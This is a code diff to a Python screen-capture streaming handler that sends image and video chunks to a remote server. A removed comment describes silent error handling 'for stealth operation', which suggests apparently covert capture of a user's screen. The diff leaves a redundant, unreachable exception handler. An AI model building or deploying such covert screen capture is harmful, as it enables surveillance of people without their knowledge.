@@ -163,21 +163,20 @@ class StreamHandler:
             chunk_data = {
                 'chunk': img_data,
                 'sequence': self.sequence,
-                'timestamp': datetime.now().isoformat()
+                'timestamp': datetime.now().isoformat(),
+                'client_id': Config.CLIENT_ID
             }
             
-            response = requests.post(
-                f"{Config.SERVER_URL}/api/stream/chunk/{Config.CLIENT_ID}",
-                json=chunk_data,
-                timeout=5
-            )
+            response = self.api_client.post(f'/api/stream/chunk/{Config.CLIENT_ID}', chunk_data)
             
-            if response.status_code == 200:
+            if response:
                 self.sequence += 1
+                logging.debug(f"Stream chunk {self.sequence} sent successfully")
+            else:
+                logging.debug(f"Failed to send stream chunk {self.sequence}")
                 
         except Exception as e:
-            # Silent error for stealth operation
-            pass
+            logging.debug(f"Error sending stream chunk: {str(e)}")
             
     def start_ffmpeg_stream(self):
         """Start FFmpeg screen capture and streaming"""
@@ -269,20 +268,21 @@ class StreamHandler:
             
             data = {
                 'chunk': encoded_chunk,
-                'sequence': self.sequence
+                'sequence': self.sequence,
+                'client_id': Config.CLIENT_ID,
+                'timestamp': datetime.now().isoformat()
             }
             
-            response = requests.post(
-                f"{Config.SERVER_URL}/api/stream/chunk/{Config.CLIENT_ID}",
-                json=data,
-                headers={'Authorization': f'Bearer {self.api_client.auth_token}'},
-                timeout=5
-            )
+            response = self.api_client.post(f'/api/stream/chunk/{Config.CLIENT_ID}', data)
             
-            if response.status_code == 200:
+            if response:
                 self.sequence += 1
+                logging.debug(f"Video chunk {self.sequence} sent successfully")
             else:
-                logging.warning(f"Failed to send chunk: {response.status_code}")
+                logging.debug(f"Failed to send video chunk {self.sequence}")
+                
+        except Exception as e:
+            logging.debug(f"Error sending video chunk: {str(e)}")
                 
         except Exception as e:
             logging.error(f"Error sending chunk to server: {e}")
